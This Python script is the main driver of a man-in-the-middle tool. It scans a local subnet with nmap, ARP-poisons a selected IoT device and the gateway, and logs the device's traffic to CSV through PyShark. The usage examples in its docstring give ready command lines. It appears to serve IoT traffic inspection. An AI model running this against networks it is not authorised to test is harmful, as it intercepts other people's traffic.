from ArpSpoofing import ArpSpoofing
from DiscoverHosts import select_device
from PySharkCapture import PySharkCapture
import argparse
import os
import sys

"""
Use cases:
1. Specify the IP of target IoT device and the IP of the gateway router. The script skips scanning hosts and starts ARP poisoning
    sudo python mitm_main.py -t 192.168.0.215 -g 192.168.0.1

2. Specify a subnet mask for host scanning and the IP of the gateway router. The script scans the given subnet, prompts the user to select a target device and starts ARP poisoning.
    sudo python mitm_main.py -s 192.168.0.0/24 -g 192.168.0.1

3. Don't specify anything (like a regular user). The script scans common residential subnets and continues the same way as (2).
    sudo python mitm_main.py
"""


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP")
    parser.add_argument("-s", "--scan", dest="scan",
                        help="Subnet mask for scanning hosts")
    options = parser.parse_args()
    return options


if (os.geteuid() != 0):
    print("Root privilege is needed to discover hosts using nmap.")
    sys.exit(1)

options = get_arguments()
target, gateway = select_device(options)

arp_spoofing = ArpSpoofing(target, gateway)
arp_spoofing.start()

# Do packet sniffing work in PyShark and save dumps to CSV file
pyshark_capture = PySharkCapture(target)
pyshark_capture.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    # Close the pyshark capture
    pyshark_capture.restore_flag.set()
    pyshark_capture.join()

    # Restore the ARP Spoofing tables
    arp_spoofing.restore_flag.set()
    arp_spoofing.join()

    sys.exit(0)
